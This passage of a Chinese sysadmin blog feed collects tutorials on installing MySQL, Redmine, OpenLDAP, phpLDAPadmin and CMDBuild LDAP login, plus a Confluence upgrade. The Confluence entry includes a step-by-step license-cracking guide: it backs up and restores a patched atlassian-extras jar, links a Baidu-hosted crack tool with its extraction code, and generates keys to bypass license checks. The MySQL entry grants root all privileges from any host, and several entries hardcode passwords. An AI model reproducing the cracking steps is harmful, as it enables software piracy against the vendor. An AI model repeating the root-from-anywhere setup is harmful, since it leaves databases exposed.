<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>启动mysql,要知道在centos7中，没有了service命令，都是使用systemctl命令。注意启动的时候是start mysqld而不是mysql。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">systemctl start mysqld</span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">systemctl status mysqld</span><br></pre></td></tr></table></figure>

<p><img src="/articles/5449f5b8/4.png" alt></p>
<p>如图所示，是已经启动了</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h4 id="修改数据库密码"><a href="#修改数据库密码" class="headerlink" title="修改数据库密码"></a>修改数据库密码</h4><p>mysql5.7的新特性之一就是在初始化的时候会生成一个自定义的密码，然后你需要找到这个密码，登录的时候输入。注意，输入密码的时候是不显示。</p>
<p>找到密码: 红框的地方就是密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">'temporary password'</span> /var/<span class="built_in">log</span>/mysqld.log</span><br></pre></td></tr></table></figure>

<p><img src="/articles/5449f5b8/5.png" alt></p>
<p><strong>登录数据库：这里-p之后不用输入密码，回车后再输入。改过密码之后登录则是直接在-p后加密码了。</strong></p>
<p><strong>修改密码</strong></p>
<p>注意，修改的密码太简单会不给修改，把大小写字母和数字加上就肯定可以了。然后切记切记，mysql里面的命令要加分号！分号！分号！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET PASSWORD = PASSWORD(&apos;Sun123$%^&apos;);</span><br></pre></td></tr></table></figure>

<p><strong>设置远程可以登录</strong></p>
<p>现在这样是无法在本地用工具登录访问的，现在要做两件事，一件事是将云服务器上的3306端口开放；另一件事是配置远程可以访问。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;Admin123!&apos; WITH GRANT OPTION;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<p>先设置刚才的密码可以远程登录，然后使用flush命令使配置立即生效。<br>如果还不行可以尝试重启一下数据库。</p>
<p><img src="/articles/5449f5b8/6.png" alt></p>
<h4 id="优化配置"><a href="#优化配置" class="headerlink" title="优化配置"></a>优化配置</h4><p>mysql的配置文件真的很多，有的还很蛋疼。比如默认的字符集是拉丁字符集，每次创建数据库的时候要设置字符集；默认还不支持group by语句，默认的时区也不是我们现在的北京时间(东八区)，会导致我们的时间差了13个点。针对以上说几个简要的配置，更多的配置在以后遇到了再加上，或者留言吧！</p>
<p>打开配置文件，yum安装的默认在/etc文件夹下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br><span class="line"></span><br><span class="line"><span class="comment">#在[mysqld]下面添加，不需要分号</span></span><br><span class="line"><span class="comment">#字符集:注意是utf8而不是utf-8!</span></span><br><span class="line">character-set-server=utf8</span><br><span class="line"><span class="comment">#这时候使用show variables like 'char%';就可以查看到字符集都是utf8了</span></span><br><span class="line"><span class="comment">#sql支持group by语句</span></span><br><span class="line">sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</span><br><span class="line"><span class="comment">#设置时区为东八区</span></span><br><span class="line">default-time_zone = <span class="string">'+8:00'</span></span><br></pre></td></tr></table></figure>

<p>最后重启数据库，使配置生效。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure>

<h2 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a><strong>设置开机启动</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> mysqld</span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<p>安装记录就到这里，更多的配置在遇到后继续更新。</p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>SQL</category>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>docker安装redmine服务</title>
    <url>/articles/40baf0f.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>快速搭建redmine服务，以便能够对项目和工作流进行管控。</p>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://hub.docker.com/_/redmine" target="_blank" rel="noopener">官方文档</a>或者<a href="https://docs.docker.com/samples/library/redmine/" target="_blank" rel="noopener">docker官方</a></p>
<a id="more"></a>



<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h4 id="用SQLite3运行Redmine"><a href="#用SQLite3运行Redmine" class="headerlink" title="用SQLite3运行Redmine"></a>用SQLite3运行Redmine</h4><p>这是最简单的方式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name sunredmine redmine:3.4</span><br></pre></td></tr></table></figure>

<h4 id="使用数据库容器运行Redmine"><a href="#使用数据库容器运行Redmine" class="headerlink" title="使用数据库容器运行Redmine"></a>使用数据库容器运行Redmine</h4><p>建议使用数据库服务器运行Redmine。</p>
<p>1, 启动数据库容器</p>
<p>PostgreSQL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name some-postgres --network some-network -e POSTGRES_PASSWORD=secret -e POSTGRES_USER=redmine postgres</span><br></pre></td></tr></table></figure>

<p>MySQL的（替代<code>-e REDMINE_DB_POSTGRES=some-postgres</code>与<code>-e REDMINE_DB_MYSQL=some-mysql</code>运行管理平台时）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name some-mysql --network some-network -e MYSQL_USER=redmine -e MYSQL_PASSWORD=secret -e MYSQL_DATABASE=redmine -e MYSQL_RANDOM_ROOT_PASSWORD=1 mysql:5.7</span><br></pre></td></tr></table></figure>

<p>2, 运行redmine</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name some-redmine --network some-network -e REDMINE_DB_POSTGRES=some-postgres -e REDMINE_DB_USERNAME=redmine -e REDMINE_DB_PASSWORD=secret redmine</span><br></pre></td></tr></table></figure>

<h2 id="完整例子"><a href="#完整例子" class="headerlink" title="完整例子"></a>完整例子</h2><p>假设已有postgres数据库容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name pgsql -p 5432:5432 -e POSTGRES_PASSWORD=sunxu123 -v /data/postgres:/var/lib/postgresql/data -d postgres:9.4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入容器后操作</span></span><br><span class="line">docker <span class="built_in">exec</span> -it pgsql /bin/bash</span><br><span class="line"><span class="comment"># 进Postgresql账号</span></span><br><span class="line">su postgres</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">CREATE USER redmine WITH PASSWORD <span class="string">'Sun123'</span>;</span><br><span class="line"><span class="comment"># 建库</span></span><br><span class="line">createdb -O redmine redmine 和 CREATE DATABASE redmine OWNER redmine等效,二选一即可</span><br><span class="line"><span class="comment"># 赋权</span></span><br><span class="line">GRANT ALL PRIVILEGES ON DATABASE redmine to redmine;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动redmine</span></span><br><span class="line">docker run  --name redmine -p 10083:3000 -v /data/redmine/data:/usr/src/redmine/files --link pgsql:remine -d redmine:3.4</span><br><span class="line"><span class="comment"># 查看日志</span></span><br><span class="line">docker logs -f remine</span><br></pre></td></tr></table></figure>

<h2 id="功能完善"><a href="#功能完善" class="headerlink" title="功能完善"></a>功能完善</h2><h4 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker redmine:/usr/src/redmine/config/configuration.yml.example  ./</span><br><span class="line">mv configuration.yml.example configuration.yml</span><br><span class="line">vim configuration.yml</span><br><span class="line"></span><br><span class="line">default:</span><br><span class="line">  email_delivery:</span><br><span class="line">    delivery_method: :smtp</span><br><span class="line">    smtp_settings:</span><br><span class="line">      enable_starttls_auto: <span class="literal">true</span></span><br><span class="line">      address: <span class="string">"xxxxxxxxxxx"</span></span><br><span class="line">      port: 587</span><br><span class="line">      authentication: :login</span><br><span class="line">      domain: <span class="string">'xxxxxxxxxxxxxx'</span></span><br><span class="line">      user_name: <span class="string">'xxxxxxxxxxxxx'</span></span><br><span class="line">      password: <span class="string">'xxxxxxxxxxxx'</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/40baf0f/1.png" alt></p>
<p><strong>测试是否配置成功：</strong><br>打开Redmine &gt;管理员登陆 &gt; 管理 &gt; 配置 &gt; 邮件通知 &gt;页面底部:发送测试邮件。将会发送邮件到你目前登陆的用户邮箱中。</p>
<p>如果没有配置成功，则这个选项卡显示的是黄色的字，如未对邮件进行配置，config/configuration.yml。</p>
<h4 id="ldap接入和用户同步"><a href="#ldap接入和用户同步" class="headerlink" title="ldap接入和用户同步"></a>ldap接入和用户同步</h4><p>原始的ldap认证，我试了下不完美，他需要创建用户然后使用ldap认证，也就是说还是需要先去创建用户。这样显得很麻烦</p>
<p><img src="/articles/40baf0f/2.png" alt></p>
<p>Base dn是基准DN</p>
<p>LDAP过滤器是用来过滤你需要加入到redmine里的用户，我这里是用对象类即objectclass去filter用户</p>
<p>认证模式改以下就好。</p>
<p>但是这样还是创建用户 还是麻烦 这个时候需要用到ldap的插件（Redmine LDAP Sync）</p>
<p>插件安装基本官网都有说</p>
<p>git：<a href="https://github.com/thorin/redmine_ldap_sync#rake-tasks" target="_blank" rel="noopener">https://github.com/thorin/redmine_ldap_sync#rake-tasks</a></p>
<p>里面有介绍我这里就不说了，大致上就两步</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为这个插件好多年不再维护了只能支持redmine3.4.x最新的redmine4.0.x不支持，会报错，这也是为什么docker启动时用3.4版本的原因</span><br><span class="line"></span><br><span class="line">1，在#&#123;RAILS_ROOT&#125;/plugins目录下下载插件</span><br><span class="line">git clone git://github.com/thorin/redmine_ldap_sync.git</span><br><span class="line">2，在#&#123;RAILS_ROOT&#125; 目录下执行</span><br><span class="line">rake -T redmine:plugins:ldap_sync RAILS_ENV=production</span><br></pre></td></tr></table></figure>

<p><img src="/articles/40baf0f/4.png" alt></p>
<p>插件安装好之后重启redmine也就是nginx</p>
<p>然后打开web发现会多一个ldap sync<br><img src="/articles/40baf0f/5.png" alt></p>
<p>填写好测试完成看看结果</p>
<p><img src="/articles/40baf0f/6.png" alt></p>
<p><img src="/articles/40baf0f/7.png" alt></p>
<p><img src="/articles/40baf0f/8.png" alt></p>
<p>配置项根据自己的环境设置，设置好之后点击第三栏菜单test是否可以取出成功，</p>
<p>可以的话就直接激活这个ldap sync</p>
<p>之后直接去登录就可以了。</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker构建自己的openldap自助密码服务</title>
    <url>/articles/d83ca733.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>OpenLDAP安装完毕后，如果用户要修改密码的话，就需要通过OpenLDAP管理员来进行修改。为了解放管理员的工作，让OpenLDAP用户可以自行进行密码的修改和重置，就需要我们来搭建一套自助修改密码系统。</p>
<p>在此我们使用的是开源的基于php语言开发的ldap自助修改密码系统Self Service Password。</p>
<h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><p><a href="https://github.com/wandouduoduo/docker-ssp" target="_blank" rel="noopener">参考文档</a></p>
<a id="more"></a>

<p>按照参考文档正确配置并构建镜像，运行后，登录网页访问，通过网页修改账号密码验证</p>
<p><img src="/articles/d83ca733/1.png" alt></p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>如果遇到以下错误：</p>
<p><img src="/articles/d83ca733/2.png" alt></p>
<p>修改配置:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$keyphrase = &quot;secret&quot;;  改为  $keyphrase = &quot;sunxu&quot;; #任意字符串</span><br></pre></td></tr></table></figure>

<p>重启容器，再次访问。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>邮件重置密码：</p>
<p><img src="/articles/d83ca733/3.png" alt></p>
<p>查看邮件</p>
<p><img src="/articles/d83ca733/4.png" alt></p>
<p>修改完成会收到一条邮件：</p>
<p><img src="/articles/d83ca733/5.png" alt></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title>confluence6.3.1升级最新版本6.15.8</title>
    <url>/articles/4afcf658.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>收到公司总部安全部门扫描测试，查出公司内部confluence的版本太低，存在安全漏洞。给出的解决方案是升级到最新版本，最新版本已经把该漏洞修复。本文就详细介绍下confluence的升级过程。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cwiki.us/display/CONFLUENCEWIKI/Upgrading+Confluence" target="_blank" rel="noopener">官方文档</a></p>
<a id="more"></a>

<h2 id="升级流程"><a href="#升级流程" class="headerlink" title="升级流程"></a>升级流程</h2><h3 id="备份你的数据"><a href="#备份你的数据" class="headerlink" title="备份你的数据"></a>备份你的数据</h3><h4 id="官方备份方法"><a href="#官方备份方法" class="headerlink" title="官方备份方法"></a>官方备份方法</h4><p>点击一般设置的，点击备份和还原</p>
<p><img src="/articles/4afcf658/1.png" alt></p>
<h3 id="自行备份"><a href="#自行备份" class="headerlink" title="自行备份"></a>自行备份</h3><p>1，备份数据源。默认路径为：/var/atlassian/application-data/confluence/confluence.cfg.xml</p>
<p>2，备份附件。默认路径为：/var/atlassian/application-data/confluence/attachments</p>
<h2 id="安装部署最新版"><a href="#安装部署最新版" class="headerlink" title="安装部署最新版"></a>安装部署最新版</h2><h4 id="破解文件备份"><a href="#破解文件备份" class="headerlink" title="破解文件备份"></a>破解文件备份</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv /opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.4.1.jar ~/atlassian-extras-2.4.jar</span><br></pre></td></tr></table></figure>

<h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><a href="https://www.atlassian.com/software/confluence/download" target="_blank" rel="noopener">官网下载地址</a>，放在/opt</p>
<h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x atlassian-confluence-6.15.1-x64.bin   <span class="comment">#赋予可执行权限</span></span><br><span class="line">./atlassian-confluence-6.15.1-x64.bin  <span class="comment">#执行安装</span></span><br></pre></td></tr></table></figure>

<p>到了红圈这步选择3，回车。表示升级</p>
<p><img src="/articles/4afcf658/2.png" alt></p>
<h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><p>下面询问你是否要备份，上面我们已经自己备份了，也可选他默认备份</p>
<p><img src="/articles/4afcf658/3.png" alt></p>
<h4 id="确认更新"><a href="#确认更新" class="headerlink" title="确认更新"></a>确认更新</h4><p>会展示了一些改变的文件（破解文件变了，下面伏笔），问你同意</p>
<p><img src="/articles/4afcf658/4.png" alt></p>
<h4 id="成功部署"><a href="#成功部署" class="headerlink" title="成功部署"></a>成功部署</h4><p>访问  ip:8090</p>
<h4 id="重新破解"><a href="#重新破解" class="headerlink" title="重新破解"></a>重新破解</h4><p>破解包被升级，有机会出现下面画面，代表验证不通过</p>
<p><img src="/articles/4afcf658/5.png" alt></p>
<p>把备份的atlassian-extras-2.4.jar文件复制到/opt/atlassian/confluence/confluence/WEB-INF/lib，并重命名为该版本的文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv ~/atlassian-extras-2.4.jar /opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.4.1.jar</span><br></pre></td></tr></table></figure>

<p>重启服务</p>
<p>数据和附件，无损升级到，6.15.8</p>
<p><img src="/articles/4afcf658/6.png" alt></p>
<h2 id="破解教程"><a href="#破解教程" class="headerlink" title="破解教程"></a>破解教程</h2><p>有的同学可能没有备份破解文件，或者可能不是自己搭建的，现在刚刚接手。那么如何破解呢？</p>
<h4 id="下载破解工具"><a href="#下载破解工具" class="headerlink" title="下载破解工具"></a>下载破解工具</h4><p>链接: <a href="https://pan.baidu.com/s/13GZ-3XutMEyE3cUl9rwg_Q" target="_blank" rel="noopener">https://pan.baidu.com/s/13GZ-3XutMEyE3cUl9rwg_Q</a> 提取码: 7gtd </p>
<p>破解工具是个jar包，所以需要jdk环境。jdk环境配置在网上很多，这里省略。java -jar 破解文件.jar</p>
<p><img src="/articles/4afcf658/7.png" alt></p>
<h4 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 升级时</span></span><br><span class="line">grep -Po <span class="string">"(?&lt;=server.id\"\&gt;).*(?=\&lt;)"</span> /var/atlassian/application-data/confluence/confluence.cfg.xml</span><br><span class="line"><span class="comment"># 全新安装此步骤跳过</span></span><br></pre></td></tr></table></figure>

<h4 id="生产key"><a href="#生产key" class="headerlink" title="生产key"></a>生产key</h4><p>先点.patch加载从服务器复制出来的atlassian-extras-2.4.jar文件，然后点.gen破解</p>
<p><img src="/articles/4afcf658/8.png" alt></p>
<h4 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h4><p>如权限安装，如下图填写</p>
<p><img src="/articles/4afcf658/9.png" alt></p>
<p>如升级，如下图更改配置</p>
<p>vim /var/atlassian/application-data/confluence/confluence.cfg.xml</p>
<p><img src="/articles/4afcf658/10.png" alt></p>
<p>把破解后的文件atlassian-extras-2.4.jar复制到服务器的/opt/atlassian/confluence/confluence/WEB-INF/lib/，并重命名为该版本的名称，如：atlassian-extras-decoder-v2-3.4.1.jar</p>
<h2 id="接入Ldap"><a href="#接入Ldap" class="headerlink" title="接入Ldap"></a>接入Ldap</h2><p>管理员登录，一般配置–&gt;用户目录–&gt;添加用户目录–&gt;Ldap</p>
<p><img src="/articles/4afcf658/11.png" alt></p>
<p>填写信息</p>
<p><img src="/articles/4afcf658/12.png" alt></p>
<p><img src="/articles/4afcf658/13.png" alt></p>
<p><img src="/articles/4afcf658/14.png" alt></p>
<p><img src="/articles/4afcf658/15.png" alt></p>
<p><img src="/articles/4afcf658/16.png" alt></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Confluence</tag>
      </tags>
  </entry>
  <entry>
    <title>cmdbuild接入openldap方法</title>
    <url>/articles/364a7d87.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>cmdbuid接入openldap用户权限，便于用户统一管理。</p>
<a id="more"></a>

<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>已安装好cmdbuid和openldap。</p>
<p><a href="https://wandouduoduo.github.io/articles/4fcc594d.html" target="_blank" rel="noopener">安装cmdbuild</a></p>
<p><a href="https://wandouduoduo.github.io/articles/931613a4.html#more" target="_blank" rel="noopener">安装openldap</a></p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1,  参考官方文档，如下图</p>
<p><img src="/articles/364a7d87/1.png" alt></p>
<p>翻译大意是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDAP协议配置</span><br><span class="line">在本节中，我们将看到LDAP协议的配置选项。</span><br><span class="line">CMDBuild目前仅支持使用简单绑定进行身份验证。但是可以使用</span><br><span class="line">匿名绑定以在LDAP树中搜索用户。</span><br><span class="line">要在CMDBuild中处理用户权限，必须存在要进行身份验证的用户在用户数据库表中。</span><br><span class="line">例如，如果具有LDAP UID j.doe的用户需要访问CMDBuild使用Tech Group必须遵循以下步骤：</span><br><span class="line">•使用任何密码在CMDBuild中创建用户j.doe</span><br><span class="line">•创建Tech组并定义其权限</span><br><span class="line">•将j.doe添加到Tech组</span><br><span class="line">经过上面三步后，当用户j.doe尝试验证自己时，系统将验证提供的凭据在LDAP服务器上（按身份验证类型链指定的顺序）。</span><br><span class="line"></span><br><span class="line">所以就是所需要事先安装openldap树在cmdbuild中创建用户组和用户，这样配置后才能认证，感觉有点多次一举，我既然都事先创建了，干嘛还要接入openldap。最好的方法是直接读取认证，但是目前官方不支持。</span><br><span class="line">有个想法是直接写脚本把openldap信息读取出来定时写入到cmdbuild数据库中，这样就可以实现统一管控。</span><br></pre></td></tr></table></figure>

<p>2,  配置cmdbuild认证文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /usr/<span class="built_in">local</span>/tomcat/webapps/ROOT/WEB-INF/conf/auth.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">## Authentication method chain (the first match stops the auth chain)</span></span><br><span class="line"><span class="comment">#auth.methods=HeaderAuthenticator,CasAuthenticator,LdapAuthenticator,DBAuthenticator</span></span><br><span class="line">auth.methods=LdapAuthenticator</span><br><span class="line"></span><br><span class="line"><span class="comment">#auth.case.insensitive=false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#force.ws.password.digest=true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">## HEADER</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#header.attribute.name=username</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">## CAS</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cas.server.url=https://casserver/cas</span></span><br><span class="line"><span class="comment">#cas.login.page=/login</span></span><br><span class="line"><span class="comment">#cas.service.param=service</span></span><br><span class="line"><span class="comment">#cas.ticket.param=ticket</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">## LDAP</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line">ldap.server.address=xxx.xxx.xxxx.xxx</span><br><span class="line">ldap.server.port=389</span><br><span class="line">ldap.use.ssl=<span class="literal">false</span></span><br><span class="line">ldap.basedn=dc=wandouduoduo,dc=com</span><br><span class="line">ldap.bind.attribute=uid</span><br><span class="line"></span><br><span class="line">ldap.search.filter=(objectClass=*)</span><br><span class="line"><span class="comment">##Accept only none (anonymous bind) and simple (simple bind)</span></span><br><span class="line"><span class="comment">#ldap.search.auth.method=none</span></span><br><span class="line"><span class="comment">##This section is only for simple bind</span></span><br><span class="line">ldap.search.auth.method=simple</span><br><span class="line">ldap.search.auth.principal=cn=admin,dc=wandouduoduo,dc=com</span><br><span class="line">ldap.search.auth.password=xxxx</span><br></pre></td></tr></table></figure>

<p>3，重启cmdbuild，生效配置。</p>
<p>4，日志改为debug模式，便于观察。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /usr/local/tomcat/webapps/ROOT/WEB-INF/conf/log4j.conf</span><br></pre></td></tr></table></figure>

<p><img src="/articles/364a7d87/2.png" alt></p>
<p>经过上述步骤就可实现接入步骤，观察日志，如下图：</p>
<p><img src="/articles/364a7d87/3.png" alt></p>
<p>表示认证成功，后续会补充同步脚本。</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Cmdb</tag>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker版快速安装OpenLDAP</title>
    <url>/articles/931613a4.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>互联网公司中，会开发很多平台系统，有开源的有自演的，但是每个平台或系统在用户认证方面都需要做，而且处于安全等因素考虑还必须做，统一的用户管理机制可以解决这一痛点。openldap就是这么一个工具。本文，通过docker快速搭建起来，让你体会到它的魅力。</p>
<a id="more"></a>

<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://www.openldap.org" target="_blank" rel="noopener">官网</a></p>
<p><a href="https://github.com/osixia/docker-openldap" target="_blank" rel="noopener">镜像文档</a></p>
<!--more-->

<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a><strong>拉取镜像</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull osixia/openldap</span><br></pre></td></tr></table></figure>

<h4 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a><strong>运行镜像</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#存放数据库</span></span><br><span class="line">mkdir -p /data/openldap/ldap</span><br><span class="line"><span class="comment">#存放配置</span></span><br><span class="line">mkdir -p /data/openldap/slapd.d</span><br><span class="line"></span><br><span class="line">docker run -p 389:389 --name openldap -v /data/openldap/ldap:/var/lib/ldap -v /data/openldap/slapd.d:/etc/openldap/slapd.d --network bridge --hostname openldap-host --env LDAP_ORGANISATION=<span class="string">"wandouduoduo"</span> --env LDAP_DOMAIN=<span class="string">"wandouduoduo.com"</span> --env LDAP_ADMIN_PASSWORD=<span class="string">"Sun123456"</span> --detach osixia/openldap</span><br></pre></td></tr></table></figure>

<p>配置LDAP域：<code>--env LDAP_DOMAIN=&quot;wandouduoduo.com&quot;</code></p>
<p>配置LDAP密码：<code>--env LDAP_ADMIN_PASSWORD=&quot;Sun123456&quot;</code></p>
<p>默认登录用户名：<code>admin</code></p>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h4 id="LDAP-Admin客户端"><a href="#LDAP-Admin客户端" class="headerlink" title="LDAP Admin客户端"></a>LDAP Admin客户端</h4><p>Ldap Admin是一个用于LDAP目录管理的免费Windows LDAP客户端和管理工具。此应用程序允许您在LDAP服务器上浏览，搜索，修改，创建和删除对象。它还支持更复杂的操作，例如目录复制和在远程服务器之间移动，并扩展常用编辑功能以支持特定对象类型（例如组和帐户）。</p>
<p>支持系统：<code>Winndows&amp;Linux</code></p>
<p><a href="http://www.ldapadmin.org/" target="_blank" rel="noopener">官网</a></p>
<p>下载安装LDAP Admin客户端，新增连接如下：</p>
<p><img src="/articles/931613a4/1.png" alt></p>
<p>连接成功即表明OpenLDAP安装成功。</p>
<h4 id="PHPLdapAdmin客户端"><a href="#PHPLdapAdmin客户端" class="headerlink" title="PHPLdapAdmin客户端"></a>PHPLdapAdmin客户端</h4><p>phpLDAPadmin（也称为PLA）是一个基于Web的LDAP客户端。它为LDAP服务器提供简单，随处可访问的多语言管理。</p>
<p>其分层树查看器和高级搜索功能使您可以直观地浏览和管理LDAP目录。由于它是一个Web应用程序，因此该LDAP浏览器可在许多平台上运行，使您可以从任何位置轻松管理LDAP服务器。</p>
<p>phpLDAPadmin是LDAP专业人员和新手的完美LDAP浏览器。其用户群主要由LDAP管理专业人员组成。</p>
<p><a href="http://phpldapadmin.sourceforge.net/wiki/index.php/Main_Page" target="_blank" rel="noopener">官网</a></p>
<h4 id="使用docker-安装-PHPLdapAdmin"><a href="#使用docker-安装-PHPLdapAdmin" class="headerlink" title="使用docker 安装 PHPLdapAdmin"></a>使用docker 安装 PHPLdapAdmin</h4><p><a href="https://github.com/osixia/docker-phpLDAPadmin" target="_blank" rel="noopener">https://github.com/osixia/docker-phpLDAPadmin</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --privileged -p 10004:80 --name myphpldapadmin --env PHPLDAPADMIN_HTTPS=<span class="literal">false</span> --env PHPLDAPADMIN_LDAP_HOSTS=172.17.0.6 --detach osixia/phpldapadmin</span><br></pre></td></tr></table></figure>

<p>配置的Ldap地址：<code>--env PHPLDAPADMIN_LDAP_HOSTS=172.17.0.6</code></p>
<p>配置不开启HTTPS：<code>--env PHPLDAPADMIN_HTTPS=false</code>（默认是true）</p>
<p>如果开启HTTPS，需要配置443端口映射：<code>-p 8443:443</code>，并采用https访问</p>
<p><strong>通过访问<a href="http://localhost:10004" target="_blank" rel="noopener">http://localhost:10004</a> 来管理，登陆界面</strong></p>
<p><img src="/articles/931613a4/2.png" alt></p>
<p><strong>点击login进行登录</strong></p>
<p><strong>Login DN：</strong><code>cn=admin,dc=wandouduoduo,dc=com</code></p>
<p><strong>Password：</strong><code>ldap123</code></p>
<p><strong>登录成功后如下：</strong></p>
<p><img src="/articles/931613a4/3.png" alt></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过本文可以快速搭建和使用openldap, 但是默认openldap是没有打开memerof功能的，如有兴趣，请参考</p>
<p><a href="https://wandouduoduo.github.io/articles/53f92c3c.html" target="_blank" rel="noopener">OpenLDAP启用MemberOf</a></p>
<p><a href="https://blog.csdn.net/Michaelwubo/article/details/80525284" target="_blank" rel="noopener">ldapsearch用法</a></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenLDAP启用MemberOf</title>
    <url>/articles/53f92c3c.html</url>
